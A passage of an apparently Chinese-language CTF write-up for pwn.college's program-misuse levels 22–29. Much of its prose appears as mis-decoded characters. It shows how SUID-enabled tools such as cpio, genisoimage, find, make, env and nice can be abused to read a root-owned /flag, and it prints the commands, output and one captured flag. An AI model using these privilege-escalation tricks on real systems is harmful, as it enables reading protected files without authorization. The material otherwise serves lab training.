hacker@program-misuse~level22:/$ <span class="token function">find</span> flag<span class="token operator">|</span>cpio <span class="token parameter variable">-ov</span> <span class="token operator">></span> flag.cpio
ssh-entrypoint: flag.cpio: Permission denied
hacker@program-misuse~level22:/$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂèØ‰ª•ÂèëÁé∞ÔºåcpioÊ≤°ÊúâÂØπflagÁöÑËØªÊùÉÈôêÔºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•Áî®findÂëΩ‰ª§ËøõË°åÁªïËøáÔºåÂàõÂª∫flag.cpioÂèàË¢´ÊãíÁªùËØ¥Êòécpio‰πüÊ≤°ÊúâÂÜôÊùÉÈôê</p>
<p>Âú®ÁΩë‰∏äÊêú‰∫ÜÊêúÂÖ∂‰ªñdlÁöÑÊÄùË∑Ø</p>
<p>ÂèëÁé∞ÈÄöÂ∏∏Êúâ‰∏§‰∏™Âú∞ÊñπÂèØ‰ª•Â≠òÊîæÂéãÁº©Êñá‰ª∂,ÊúâÂÜôÂÖ•ÊùÉÈôê„ÄÇ</p>
<ol>
<li><code>/home/hacker: home directory.</code></li>
<li><code>/tmp: temp directory</code></li>
</ol>
<p>ËøôÈáåÊàë‰ª¨‰ΩøÁî®<code>/tmp</code>ÁõÆÂΩïÔºå</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ <span class="token function">find</span> flag<span class="token operator">|</span>cpio <span class="token parameter variable">-ov</span> <span class="token operator">></span> /tmp/flag.cpio
flag
<span class="token number">1</span> block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Êé•ÁùÄÁî®<code>cpio</code>ËØªÂèñÂΩíÊ°£ÁöÑÂÜÖÂÆπ</p>
<p>Êàë‰ª¨ÈúÄË¶Å‰ΩøÁî®‚Äú <code>-i</code> ‚ÄùÊù•ÊèêÂèñÂÜÖÂÆπÔºåÁÑ∂ÂêéÊâìÂç∞Âá∫ÂåÖÂê´‚Äú <code>--to-stdout</code> ‚ÄùÁöÑÂÜÖÂÆπÔºåÂÖ∂‰∏≠‚Äú <code>Extract files to standard output</code>‚ÄùÊòØÊâìÂç∞ÁöÑÂÜÖÂÆπ„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ <span class="token builtin class-name">cd</span> /tmp
hacker@program-misuse~level22:/tmp$ cpio <span class="token parameter variable">-i</span> --to-stdout <span class="token operator">&lt;</span> flag.cpio
pwn.college<span class="token punctuation">&#123;</span>A0MclfD9AoelVA-b-hXVQ_byLYK.0FN2EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span class="token number">1</span> block
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level23genisoimage"><a class="markdownIt-Anchor" href="#level23genisoimage"></a> level23(genisoimage)</h3>
<p><s>ÂèàÊúâ‰∫øÁÇπÁÇπÈöæ</s></p>
<p><code>genisoimage</code> ÂëΩ‰ª§Áî®‰∫éÂàõÂª∫ ISO9660 ÂÖâÁõòÊò†ÂÉèÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØÂàõÂª∫ ISO ÈïúÂÉè„ÄÇÂÆÉÊòØÂú® Linux ‰∏≠Áî®‰∫éÂàõÂª∫ÂÖâÁõòÈïúÂÉèÊñá‰ª∂ÁöÑÂ∑•ÂÖ∑‰πã‰∏Ä„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>genisoimage</code> ÂëΩ‰ª§ÂèÇÊï∞Ôºö</p>
<ol>
<li>
<p><strong>-o filename</strong>ÔºöÊåáÂÆöËæìÂá∫Êñá‰ª∂ÁöÑÂêçÁß∞„ÄÇ</p>
</li>
<li>
<p><strong>-r</strong>ÔºöÂÖÅËÆ∏Âú® ISO9660 Êñá‰ª∂Á≥ªÁªü‰∏≠‰øùÂ≠òÊôÆÈÄöÁî®Êà∑ÁöÑÊñá‰ª∂ÊùÉÈôêÂíåÂ±ûÊÄß„ÄÇ</p>
</li>
<li>
<p><strong>-J</strong>ÔºöÁîüÊàêÈÄÇÁî®‰∫é Windows ÁöÑ Joliet Êâ©Â±ïÊ†ºÂºèÁöÑ ISO9660 Êñá‰ª∂Á≥ªÁªü„ÄÇ</p>
</li>
<li>
<p><strong>-joliet-long</strong>ÔºöÂÖÅËÆ∏‰ΩøÁî®ÈïøÊñá‰ª∂Âêç„ÄÇ</p>
</li>
<li>
<p><strong>-l</strong>ÔºöÂÖÅËÆ∏ÁîüÊàê Rock Ridge Êâ©Â±ïÊ†ºÂºèÁöÑ ISO9660 Êñá‰ª∂Á≥ªÁªüÔºå‰ª•ÊîØÊåÅ UNIX È£éÊ†ºÁöÑÈïøÊñá‰ª∂ÂêçÂíåÊùÉÈôê„ÄÇ</p>
</li>
<li>
<p><strong>-V volumeid</strong>ÔºöÊåáÂÆöÂç∑Ê†áÔºàÂÖâÁõòÂêçÁß∞Ôºâ„ÄÇ</p>
</li>
<li>
<p><strong>-input-charset charset</strong>ÔºöÊåáÂÆöËæìÂÖ•Êñá‰ª∂ÂêçÁöÑÂ≠óÁ¨¶ÈõÜ„ÄÇ</p>
</li>
<li>
<p><strong>-graft-points</strong>ÔºöÂÖÅËÆ∏Â∞ÜÊñá‰ª∂ÊàñÁõÆÂΩïÊ∑ªÂä†Âà∞Êò†ÂÉèÁöÑÁâπÂÆöË∑ØÂæÑ„ÄÇ</p>
</li>
<li>
<p><strong>-R</strong>Ôºö‰ΩøÁî® Rock Ridge Êâ©Â±ïÊ†ºÂºèÁîüÊàê ISO9660 Êñá‰ª∂Á≥ªÁªüÔºå‰ª•ÊîØÊåÅ UNIX È£éÊ†ºÁöÑÈïøÊñá‰ª∂ÂêçÂíåÊùÉÈôê„ÄÇ</p>
</li>
<li>
<p><strong>-b boot_image</strong>ÔºöÊåáÂÆöÁî®‰∫éÂºïÂØºÂÖâÁõòÁöÑÂºïÂØºÊò†ÂÉèÊñá‰ª∂„ÄÇ</p>
</li>
<li>
<p><strong>-no-emul-boot</strong>ÔºöÁ¶ÅÊ≠¢Ê®°ÊãüËΩØÁõòÂºïÂØº„ÄÇ</p>
</li>
<li>
<p><strong>-boot-load-size load_sectors</strong>ÔºöÊåáÂÆöÂä†ËΩΩÂå∫ÂüüÁöÑÂ§ßÂ∞èÔºà‰ª•ÊâáÂå∫‰∏∫Âçï‰ΩçÔºâ„ÄÇ</p>
</li>
<li>
<p><strong>-boot-info-table</strong>ÔºöÂú®ÂºïÂØºÊò†ÂÉè‰∏≠ÂàõÂª∫‰∏Ä‰∏™ÂºïÂØº‰ø°ÊÅØË°®„ÄÇ</p>
</li>
<li>
<p><strong>-eltorito-boot boot_image</strong>ÔºöÊåáÂÆö El Torito ÂºïÂØºÊò†ÂÉèÊñá‰ª∂„ÄÇ</p>
</li>
<li>
<p><strong>-eltorito-catalog boot_catalog</strong>ÔºöÊåáÂÆö El Torito ÂºïÂØºÁõÆÂΩïÊñá‰ª∂„ÄÇ</p>
</li>
<li>
<p><strong>-quiet</strong>ÔºöÈùôÈªòÊ®°ÂºèÔºåÂáèÂ∞ëËæìÂá∫„ÄÇ</p>
</li>
</ol>
<p>ÂèØ‰ª•Âú®ÁªàÁ´Ø‰∏≠ËøêË°å <code>man genisoimage</code> ÂëΩ‰ª§Êù•Êü•Áúã <code>genisoimage</code> ÁöÑÊâãÂÜåÈ°µ„ÄÇ</p>
<p>‰∏ªË¶ÅËøôÈáåÂëΩ‰ª§ÊØîËæÉÂ§öÔºåË¶Å‰∏Ä‰∏™‰∏Ä‰∏™Â∞ùËØï</p>
<p>Ëá™Âä®ÂåñÂ∞ùËØïÂëΩ‰ª§</p>
<p><code>genisoimage --help 2&gt;&amp;1 | grep FILE | awk '&#123;print $1&#125;'</code></p>
<p>Ëß£Èáä</p>
<ul>
<li>genisoimage --help Ëé∑ÂèñËØ•Á®ãÂ∫èÁöÑÂ∏ÆÂä©‰ø°ÊÅØ</li>
<li>ÊêúÁ¥¢ÊúâÂÖ≥Êñá‰ª∂ÁöÑÂëΩ‰ª§</li>
<li>awk ‚Äò{print($1)}‚Äô ÊâìÂç∞Á¨¨‰∏ÄÂàó</li>
</ul>
<p><code>for option in $(genisoimage --help 2&gt;&amp;1 | grep FILE | awk '&#123;print $1&#125;'); do echo $option; genisoimage $option /flag; done</code></p>
<p>ÊµãËØïÂèëÁé∞ÔºåÂèØ‰ª•Áî®<code>sort</code>Êåá‰ª§ÊâìÂç∞Âá∫<code>flag</code>,‰∫ãÂÆû‰∏äÊàëËÆ§‰∏∫Ëøô‰∏™ÊºèÊ¥ûÊàêÂõ†ÊòØÔºå-sort ÈÄâÈ°πÊòØÂà∂ÂÆöÊñá‰ª∂ÂíåÁõÆÂΩïÁöÑÊéíÂ∫èÈ°∫Â∫èÔºå‰ΩÜÊòØ<code>flag</code>Êñá‰ª∂ÊòØ‰∏çÊ≠£Á°ÆÁöÑÊ†ºÂºèÔºågenisoimage‰ºöËØªÂèñÊñá‰ª∂ÔºåÂπ∂‰∏îÂ∞ÜÊä•Èîô‰ø°ÊÅØÔºàÂåÖÂê´‰∫ÜÊñá‰ª∂ÂÜÖÂÆπÔºâÊâìÂç∞Âà∞ÁªàÁ´Ø</p>
<p>‰∫éÊòØÊ≠£Á°ÆÁöÑ<code>payload</code>:<code>genisoimage -sort flag</code></p>
<h3 id="level24env"><a class="markdownIt-Anchor" href="#level24env"></a> level24(env)</h3>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/env/">env | GTFOBins</a></p>
<p><code>env</code>ÊòØ‰∏Ä‰∏™Áî®‰∫éÂú®ÂΩìÂâçÁéØÂ¢É‰∏≠ÊâßË°åÂëΩ‰ª§ÁöÑÂÆûÁî®Â∑•ÂÖ∑„ÄÇÂÆÉÁöÑ‰∏ªË¶Å‰ΩúÁî®ÊòØ‰∏∫ÂëΩ‰ª§ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÔºåÁÑ∂ÂêéÊâßË°åËØ•ÂëΩ‰ª§„ÄÇÂú®‰∏çÂêåÁöÑÊìç‰ΩúÁ≥ªÁªü‰∏äÔºå<code>env</code>ÁöÑÂäüËÉΩÂíåÁî®Ê≥ïÂèØËÉΩÊúâÊâÄ‰∏çÂêåÔºå‰ΩÜÂÆÉÈÄöÂ∏∏Áî®‰∫é‰ª•‰∏ãÂá†‰∏™ÊñπÈù¢Ôºö</p>
<ol>
<li>
<p><strong>ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè</strong>ÔºöÈÄöËøá<code>env</code>ÂëΩ‰ª§ÂèØ‰ª•ËÆæÁΩÆÂëΩ‰ª§ÊâßË°åÊó∂ÊâÄÈúÄÁöÑÁéØÂ¢ÉÂèòÈáè„ÄÇËøô‰∫õÂèòÈáèÂèØ‰ª•ÂåÖÊã¨Ë∑ØÂæÑ„ÄÅËØ≠Ë®Ä„ÄÅÁºñËØëÂô®ÈÄâÈ°πÁ≠â„ÄÇ</p>
</li>
<li>
<p><strong>ÊâßË°åÂëΩ‰ª§</strong>Ôºö<code>env</code>ËøòÂèØ‰ª•Áî®Êù•ÊâßË°åÁâπÂÆöÁöÑÂëΩ‰ª§ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•Âú®ÊâßË°åÂëΩ‰ª§‰πãÂâçËÆæÁΩÆÂ•ΩÊâÄÈúÄÁöÑÁéØÂ¢ÉÂèòÈáè„ÄÇ</p>
</li>
<li>
<p><strong>Êü•ËØ¢ÂΩìÂâçÁéØÂ¢ÉÂèòÈáè</strong>ÔºöÂú®‰∏çÊåáÂÆöÂëΩ‰ª§ÁöÑÊÉÖÂÜµ‰∏ãÔºå<code>env</code>‰ºöÊâìÂç∞ÂΩìÂâçÁéØÂ¢É‰∏≠Â∑≤ËÆæÁΩÆÁöÑÊâÄÊúâÂèòÈáè„ÄÇ</p>
</li>
</ol>
<p>‰∏ãÈù¢ÊòØ‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÁî®Ê≥ïÔºö</p>
<ul>
<li>
<p><strong>ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÂπ∂ÊâßË°åÂëΩ‰ª§</strong>Ôºö<code>env VAR=value command</code>„ÄÇËøôÂ∞Ü‰∏¥Êó∂ËÆæÁΩÆ‰∏Ä‰∏™ÁéØÂ¢ÉÂèòÈáè<code>VAR</code>ÁöÑÂÄº‰∏∫<code>value</code>ÔºåÁÑ∂ÂêéÊâßË°å<code>command</code>„ÄÇ</p>
</li>
<li>
<p><strong>Êü•ËØ¢ÂΩìÂâçÁéØÂ¢ÉÂèòÈáè</strong>Ôºö<code>env</code>„ÄÇËøôÂ∞ÜÊâìÂç∞ÂΩìÂâçÁéØÂ¢É‰∏≠ÊâÄÊúâÂ∑≤ËÆæÁΩÆÁöÑÂèòÈáèÂèäÂÖ∂ÂÄº„ÄÇ</p>
</li>
<li>
<p><strong>ËÆæÁΩÆÂ§ö‰∏™ÁéØÂ¢ÉÂèòÈáè</strong>Ôºö<code>env VAR1=value1 VAR2=value2 command</code>„ÄÇËøôÂ∞ÜËÆæÁΩÆÂ§ö‰∏™ÁéØÂ¢ÉÂèòÈáèÁöÑÂÄºÔºåÁÑ∂ÂêéÊâßË°åÂëΩ‰ª§„ÄÇ</p>
</li>
<li>
<p><strong>Âú®ËÑöÊú¨‰∏≠‰ΩøÁî®</strong>Ôºö<code>#!/usr/bin/env python</code>„ÄÇËøôÊòØËÑöÊú¨‰∏≠Â∏∏ËßÅÁöÑÁî®Ê≥ïÔºåÂÆÉÂëäËØâÁ≥ªÁªüÂéª<code>/usr/bin</code>ÁõÆÂΩï‰∏ãÊâæÂà∞<code>python</code>Ëß£ÈáäÂô®ÔºåÂπ∂Áî®ÂÆÉÊù•ÊâßË°åËÑöÊú¨„ÄÇ</p>
</li>
</ul>
<p><code>env cat flag</code></p>
<h3 id="level25find"><a class="markdownIt-Anchor" href="#level25find"></a> level25(find)</h3>
<p><code>find</code>‰πüÂèØÁî®‰∫éÂëΩ‰ª§ÊâßË°å</p>
<p>Â∏∏ËßÅÁöÑ<code>find</code>ÂëΩ‰ª§ÈÄâÈ°πÂåÖÊã¨Ôºö</p>
<ul>
<li><code>-name</code>ÔºöÊ†πÊçÆÊñá‰ª∂ÂêçËøõË°åÊêúÁ¥¢„ÄÇ</li>
<li><code>-type</code>ÔºöÊ†πÊçÆÊñá‰ª∂Á±ªÂûãËøõË°åÊêúÁ¥¢ÔºåÂ¶ÇÊôÆÈÄöÊñá‰ª∂Ôºà<code>f</code>Ôºâ„ÄÅÁõÆÂΩïÔºà<code>d</code>ÔºâÁ≠â„ÄÇ</li>
<li><code>-perm</code>ÔºöÊ†πÊçÆÊñá‰ª∂ÊùÉÈôêËøõË°åÊêúÁ¥¢„ÄÇ</li>
<li><code>-user</code>ÔºöÊ†πÊçÆÊñá‰ª∂ÊâÄÊúâËÄÖËøõË°åÊêúÁ¥¢„ÄÇ</li>
<li><code>-group</code>ÔºöÊ†πÊçÆÊñá‰ª∂ÊâÄÂ±ûÁªÑËøõË°åÊêúÁ¥¢„ÄÇ</li>
<li><code>-size</code>ÔºöÊ†πÊçÆÊñá‰ª∂Â§ßÂ∞èËøõË°åÊêúÁ¥¢„ÄÇ</li>
<li><code>-mtime</code>„ÄÅ<code>-atime</code>„ÄÅ<code>-ctime</code>ÔºöÊ†πÊçÆÊñá‰ª∂ÁöÑ‰øÆÊîπÊó∂Èó¥„ÄÅËÆøÈóÆÊó∂Èó¥„ÄÅÁä∂ÊÄÅÊîπÂèòÊó∂Èó¥ËøõË°åÊêúÁ¥¢„ÄÇ</li>
</ul>
<p>Â∏∏ËßÅÁöÑ<code>find</code>ÂëΩ‰ª§Êìç‰ΩúÂåÖÊã¨Ôºö</p>
<ul>
<li><code>-print</code>ÔºöÊâìÂç∞ÂåπÈÖçÁöÑÊñá‰ª∂Âêç„ÄÇ</li>
<li><code>-exec</code>ÔºöÂØπÂåπÈÖçÁöÑÊñá‰ª∂ÊâßË°åÊåáÂÆöÁöÑÂëΩ‰ª§„ÄÇ</li>
</ul>
<p>‰æãÂ¶ÇÔºåË¶ÅÂú®ÂΩìÂâçÁõÆÂΩïÂèäÂÖ∂Â≠êÁõÆÂΩï‰∏≠Êü•ÊâæÊâÄÊúâÊâ©Â±ïÂêç‰∏∫<code>.txt</code>ÁöÑÊñá‰ª∂ÔºåÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">lua
Copy code
find . -type f -name &quot;*.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ËøôÂ∞ÜÂú®ÂΩìÂâçÁõÆÂΩïÂèäÂÖ∂Â≠êÁõÆÂΩï‰∏≠Êü•ÊâæÊâÄÊúâÊâ©Â±ïÂêç‰∏∫<code>.txt</code>ÁöÑÊôÆÈÄöÊñá‰ª∂ÔºåÂπ∂ÊâìÂç∞ÂÆÉ‰ª¨ÁöÑÊñá‰ª∂Âêç„ÄÇ</p>
<p><code>find</code>ÂëΩ‰ª§ÈùûÂ∏∏ÁÅµÊ¥ªÔºåÂèØ‰ª•Ê†πÊçÆÂÖ∑‰ΩìÁöÑÈúÄÊ±ÇÁªÑÂêà‰∏çÂêåÁöÑÈÄâÈ°πÂíåÊìç‰ΩúÊù•ÂÆûÁé∞ÂêÑÁßçÊêúÁ¥¢‰ªªÂä°„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /flag <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li><code>find .</code>ÔºöÂú®ÂΩìÂâçÁõÆÂΩïÂèäÂÖ∂Â≠êÁõÆÂΩï‰∏≠Êü•ÊâæÊñá‰ª∂„ÄÇ</li>
<li><code>-exec cat /flag \;</code>ÔºöÂØπ‰∫éÊØè‰∏Ä‰∏™ÊâæÂà∞ÁöÑÊñá‰ª∂ÔºåÊâßË°å<code>cat /flag</code>ÂëΩ‰ª§„ÄÇ<code>&#123;&#125;</code>ÈÄöÂ∏∏Áî®Êù•Ë°®Á§∫<code>find</code>ÂëΩ‰ª§ÊâæÂà∞ÁöÑÊñá‰ª∂ÂêçÔºåËÄå<code>\;</code>Ë°®Á§∫<code>-exec</code>ÈÄâÈ°πÁöÑÁªìÊùü„ÄÇ</li>
<li><code>-quit</code>ÔºöÂú®ÊâßË°åÁ¨¨‰∏Ä‰∏™ <code>-exec</code> ÂêéÁ´ãÂç≥ÂÅúÊ≠¢Êü•ÊâæÔºåÂç≥‰ΩøËøòÊúâÊú™ÊêúÁ¥¢ÁöÑÁõÆÂΩïÊàñÊñá‰ª∂„ÄÇ</li>
</ul>
<h3 id="level26make"><a class="markdownIt-Anchor" href="#level26make"></a> level26(make)</h3>
<p>[pwn.college-program-misuse-writeup/Babysuid <a target="_blank" rel="noopener" href="http://26.md">26.md</a> at main ¬∑ M4700F/pwn.college-program-misuse-writeup (<a target="_blank" rel="noopener" href="http://github.com">github.com</a>)](<a target="_blank" rel="noopener" href="https://github.com/M4700F/pwn.college-program-misuse-writeup/blob/main/Babysuid">https://github.com/M4700F/pwn.college-program-misuse-writeup/blob/main/Babysuid</a> <a target="_blank" rel="noopener" href="http://26.md">26.md</a>)</p>
<p>ÁÆÄÊ¥ÅÁâà:</p>
<p><code>COMMAND='cat /flag';make -s --eval=$'x:\n\t-'&quot;$COMMAND&quot;</code></p>
<ul>
<li><code>$'x:\n\t-'&quot;$COMMAND&quot;</code> ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ <code>x</code> ÁöÑÁõÆÊ†áÔºåÂú®Ëøô‰∏™ÁõÆÊ†á‰∏ãÊâßË°å‰∫ÜÁî± <code>COMMAND</code> ÂèòÈáèÂÆö‰πâÁöÑÂëΩ‰ª§„ÄÇ</li>
<li><code>COMMAND='cat /flag'</code> Â∞Ü <code>cat /flag</code> Â≠óÁ¨¶‰∏≤ËµãÁªô‰∫Ü <code>COMMAND</code> ÂèòÈáèÔºåÂç≥ <code>COMMAND</code> ÂèòÈáèÁé∞Âú®‰ª£Ë°®‰∫Ü <code>cat /flag</code> ÂëΩ‰ª§„ÄÇ</li>
<li><code>make -s --eval=...</code> ÂëΩ‰ª§Â∞Ü <code>-s</code> ÂèÇÊï∞Áî®‰∫éÈùôÈªòÊâßË°åÔºå<code>--eval</code> ÂèÇÊï∞Áî®‰∫éÂú®ÊâßË°åËøáÁ®ã‰∏≠ËÆæÁΩÆ <code>x</code> ÁõÆÊ†á‰∏ãÁöÑÂëΩ‰ª§‰∏∫ <code>cat /flag</code>„ÄÇ</li>
</ul>
<p>When you execute a command from a makefile which has been granted the <code>SUID</code> bit, the command inherits the permission of the root user. So when we run the <code>cat /flag</code>, as if we were the <code>root</code> user. That‚Äôs why it prints the flag.</p>
<p>Êàë‰ª¨‰πüÂèØ‰ª•ÁºñÂÜô‰∏Ä‰∏™<code>makefile</code></p>
<pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">build</span><span class="token punctuation">:</span>
	gcc test.c -o test
	ls ./test
	cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÁÑ∂ÂêéÁõ¥Êé•<code>make</code>Âç≥ÂèØ</p>
<h3 id="level27nice"><a class="markdownIt-Anchor" href="#level27nice"></a> level27(nice)</h3>
<p><code>nice</code> ÊòØ‰∏Ä‰∏™Áî®‰∫éË∞ÉÊï¥ËøõÁ®ã‰ºòÂÖàÁ∫ßÁöÑÂëΩ‰ª§„ÄÇÂú®UnixÂíåÁ±ªUnixÁ≥ªÁªü‰∏≠ÔºåÊØè‰∏™ËøõÁ®ãÈÉΩÊúâ‰∏Ä‰∏™‰∏é‰πãÁõ∏ÂÖ≥ÁöÑ‰ºòÂÖàÁ∫ßÔºåÁî®‰∫éÂÜ≥ÂÆöÂÆÉÂú®Á≥ªÁªüËµÑÊ∫êÂàÜÈÖç‰∏≠ÁöÑ‰ΩçÁΩÆ„ÄÇ<code>nice</code> ÂëΩ‰ª§ÂÖÅËÆ∏‰Ω†Âú®ËøêË°åÂëΩ‰ª§Êó∂‰øÆÊîπËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ß„ÄÇ</p>
<p>‰ª•‰∏ãÊòØ <code>nice</code> ÂëΩ‰ª§ÁöÑ‰∏Ä‰∫õÂ∏∏ËßÅÁî®Ê≥ïÔºö</p>
<ol>
<li>
<p><strong>ËÆæÁΩÆËøõÁ®ã‰ºòÂÖàÁ∫ß</strong>ÔºöÊúÄÁÆÄÂçïÁöÑÁî®Ê≥ïÊòØÂ∞Ü <code>nice</code> ÂëΩ‰ª§‰∏éË¶ÅÊâßË°åÁöÑÂëΩ‰ª§‰∏ÄËµ∑‰ΩøÁî®„ÄÇÈÄöËøáÂú®ÂëΩ‰ª§ÂâçÂä†‰∏ä <code>nice</code> ÂëΩ‰ª§Ôºå‰Ω†ÂèØ‰ª•‰ΩøÂæóËØ•ÂëΩ‰ª§‰ª•ËæÉ‰ΩéÁöÑ‰ºòÂÖàÁ∫ßËøêË°å„ÄÇ‰æãÂ¶ÇÔºö</p>
 <pre class="line-numbers language-none"><code class="language-none">nice -n 10 command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>command</code> ËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ßÈôç‰ΩéÂà∞ 10„ÄÇÊï∞ÂÄºËåÉÂõ¥ÈÄöÂ∏∏ÊòØ -20ÔºàÊúÄÈ´ò‰ºòÂÖàÁ∫ßÔºâÂà∞ 19ÔºàÊúÄ‰Ωé‰ºòÂÖàÁ∫ßÔºâÔºå0 ÊòØÈªòËÆ§‰ºòÂÖàÁ∫ß„ÄÇ</p>
</li>
<li>
<p><strong>Êü•ÁúãËøõÁ®ã‰ºòÂÖàÁ∫ß</strong>Ôºö‰Ω†ÂèØ‰ª•‰ΩøÁî® <code>ps</code> ÂëΩ‰ª§Êü•ÁúãÂΩìÂâçËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ß„ÄÇ‰æãÂ¶ÇÔºö</p>
 <pre class="line-numbers language-none"><code class="language-none">ps -eo pid,ni,cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÊòæÁ§∫ÂΩìÂâçËøõÁ®ãÁöÑ PID„ÄÅ‰ºòÂÖàÁ∫ßÂÄºÂíåÂëΩ‰ª§„ÄÇ</p>
</li>
<li>
<p><strong>ÊèêÈ´òËøõÁ®ã‰ºòÂÖàÁ∫ß</strong>ÔºöÂ¶ÇÊûú‰Ω†ÊúâË∂≥Â§üÁöÑÊùÉÈôêÔºå‰Ω†‰πüÂèØ‰ª•‰ΩøÁî® <code>renice</code> ÂëΩ‰ª§Êù•ÊèêÈ´òÊàñÈôç‰ΩéÂ∑≤ÁªèËøêË°å‰∏≠ËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ß„ÄÇ‰æãÂ¶ÇÔºö</p>
 <pre class="line-numbers language-none"><code class="language-none">renice -n -5 -p PID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü PID ÊâÄ‰ª£Ë°®ÁöÑËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ßÈôç‰Ωé 5 ‰∏™Á∫ßÂà´„ÄÇ</p>
</li>
<li>
<p><strong>ÂêåÊó∂ËÆæÁΩÆ nice ÂÄºÂíåË∞ÉÁî®‰ºòÂÖàÁ∫ß</strong>Ôºö‰Ω†‰πüÂèØ‰ª•ÂêåÊó∂‰ΩøÁî® <code>nice</code> Âíå <code>renice</code> ÂëΩ‰ª§„ÄÇ<code>nice</code> ÂëΩ‰ª§Áî®‰∫éËÆæÁΩÆË∞ÉÁî®ÁöÑ‰ºòÂÖàÁ∫ßÔºåËÄå <code>renice</code> ÂëΩ‰ª§Áî®‰∫éÊîπÂèòÂ∑≤ÁªèËøêË°åÁöÑËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ß„ÄÇ</p>
</li>
</ol>
<p><code>nice -n 10 cat /flag</code></p>
<p>ËøôÈáåÁöÑ <code>n</code>ÂèØ‰ª•ÊòØ<code>-20~19</code>ÁöÑ‰ªªÊÑèÊï¥Êï∞ÔºåÊ≠£Êï∞‰ºöÊèêÈ´òËøõÁ®ãÁöÑ‰ºòÂÖàÁ∫ß„ÄÇËøô‰ºöÂØºËá¥Á≥ªÁªüÊõ¥È¢ëÁπÅÂú∞‰∏∫ËØ•ËøõÁ®ãÂàÜÈÖç CPU Êó∂Èó¥Ôºå‰ªéËÄå‰ΩøÂæóËØ•ËøõÁ®ãÊõ¥Âø´Âú∞ÊâßË°å„ÄÇ</p>
<p>Â¶ÇÊûúËøôÈáånÂèñË¥üÊï∞‰ºöÂØºËá¥Ê≤°ÊúâÊùÉÈôêËé∑Âæó<code>flag</code>,ÂéüÂõ†ÂæÖËß£ÂÜ≥</p>
<h3 id="level28timeout"><a class="markdownIt-Anchor" href="#level28timeout"></a> level28(timeout)</h3>
<p>timeoutÂëΩ‰ª§‰ΩúÁî®ÊòØËøêË°åÊåáÂÆöÂëΩ‰ª§ÔºåÂ¶ÇÊûúÂú®ÊåáÂÆöÊó∂Èó¥ÂêéÂú®ËøêË°åÂàôÊùÄÊ≠ªËØ•ËøõÁ®ã„ÄÇ</p>
<p><code>timeout 114514s cat /flag</code></p>
<h3 id="level29stdbuf"><a class="markdownIt-Anchor" href="#level29stdbuf"></a> level29(stdbuf)</h3>
<p><code>stdbuf</code> ÊòØ‰∏Ä‰∏™Áî®‰∫é‰øÆÊîπÊ†áÂáÜ I/O ÁºìÂÜ≤ÊñπÂºèÁöÑÂëΩ‰ª§ÔºåÂÆÉÂÖÅËÆ∏‰Ω†Âú®ËøêË°åÂëΩ‰ª§Êó∂ÊéßÂà∂Ê†áÂáÜËæìÂÖ•„ÄÅËæìÂá∫ÂíåÈîôËØØÁöÑÁºìÂÜ≤Ë°å‰∏∫„ÄÇ‰ª•‰∏ãÊòØ <code>stdbuf</code> ÂëΩ‰ª§ÁöÑ‰∏Ä‰∫õÂ∏∏Áî®ÂèÇÊï∞Ôºö</p>
<ol>
<li>
<p><code>-i MODE</code> Êàñ <code>--input=MODE</code>ÔºöÊåáÂÆöÊ†áÂáÜËæìÂÖ•ÁöÑÁºìÂÜ≤Ê®°Âºè„ÄÇÂèØ‰ª•‰ΩøÁî® <code>MODE</code> ÂèÇÊï∞Êù•ÊåáÂÆöÊ†áÂáÜËæìÂÖ•ÁöÑÁºìÂÜ≤Ê®°ÂºèÔºåÂèØÈÄâÂÄºÂåÖÊã¨Ôºö</p>
<ul>
<li><code>0</code>ÔºöÊó†ÁºìÂÜ≤„ÄÇ</li>
<li><code>L</code>ÔºöË°åÁºìÂÜ≤ÔºàÊåâË°åÂà∑Êñ∞Ôºâ„ÄÇ</li>
<li><code>N</code>ÔºöÂùóÁºìÂÜ≤ÔºàÊåâÂùóÂà∑Êñ∞Ôºâ„ÄÇ</li>
</ul>
